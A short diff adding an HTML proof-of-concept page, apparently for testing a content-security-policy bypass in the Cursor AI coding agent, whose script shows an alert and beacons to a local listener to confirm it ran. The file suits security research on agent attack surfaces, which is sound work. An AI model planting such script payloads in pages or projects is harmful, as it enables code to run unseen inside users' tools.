@@ -1,0 +1,10 @@
+<!-- payload.html -->
+<html>
+  <body>
+    <h1>Hello</h1>
+    <script>
+      alert('CSP BYPASS POC: Executed in Cursor agent');
+      fetch('http://localhost:9000/collect?ran=true');
+    </script>
+  </body>
+</html>
